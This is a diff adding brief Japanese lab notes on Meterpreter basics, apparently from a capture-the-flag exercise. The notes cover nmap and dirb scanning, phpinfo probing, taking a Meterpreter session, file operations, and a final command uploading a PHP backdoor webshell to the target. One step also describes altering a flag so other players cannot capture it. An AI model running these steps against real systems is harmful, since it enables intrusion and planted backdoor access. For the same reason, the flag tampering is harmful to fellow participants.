@@ -1,0 +1,24 @@
+meterpreterの基礎
+1) nmap
+2) dirb http://ドメイン名でターゲットをスキャンする
+3) curl -s http://ターゲットドメイン/phpinfo.phpで、webサーバーに関する詳細情報を取得
+4) msfconsole
+5) モジュールを使って、meterpreterの権限を奪う
+6) pwdで作業ディレクトリを一覧表示にする
+7) lsで作業ディレクトリにあるファイルを一覧表示にする
+8) lpwdでローカルの現在の作業ディレクトリを確認する
+9) llsで現在の作業ディレクトリにあるにあるファイルを一覧表示する
+10) editコマンドを使ってフラグの値を変更すると、他のユーザーがフラグを取得できないようにできる
+　　その後、cat listでディレクトリ名を確認
+11) 新しいターミナルを開いて、zipファイルは、downloadでローカルにコピーして、unzipで解除する
+12) rmでzipファイルを削除する
+13)  以下で、ファイルに記載されているチェックサムを出力する
+checksum cat listの出力
+14) 以下のコマンドで、リモートマシンのPATH環境変数を確認する
+getenv PATH
+15) 以下のコマンドでファイルを探索する
+search -d /usr/bin -f *ファイル名*
+16) 以下のコマンドでローカルマシンのツールディレクトリに変更する
+lcd /root/Desktop/tools
+17)  Webshel​​l をリモート マシンの app ディレクトリにアップロードします
+upload /usr/share/webshells/php/php-backdoor.php
